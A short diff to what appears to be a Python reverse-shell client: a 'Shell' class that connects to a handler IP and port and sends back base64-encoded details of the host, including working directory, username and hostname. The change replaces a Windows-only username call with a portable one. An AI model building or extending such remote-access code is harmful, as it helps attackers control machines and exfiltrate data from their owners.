@@ -1,5 +1,4 @@
-import socket, subprocess, os, threading, json, base64, win32api, datetime
-
+import socket, subprocess, os, threading, json, base64, datetime, getpass
 class Shell:
 	def __init__(self, handler_ip, handler_port):
 		self.handler_ip = handler_ip
@@ -38,7 +37,7 @@ class Shell:
 		package["cwd"] = base64.b64encode(os.getcwd())
 		package["ip"] = base64.b64encode("192.168.1.355")
 		package["data"] = base64.b64encode(data)
-		package["username"] = base64.b64encode(win32api.GetUserName())
+		package["username"] = base64.b64encode(getpass.getuser())
 		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
 		package["hostname"] = base64.b64encode(socket.gethostname())
 
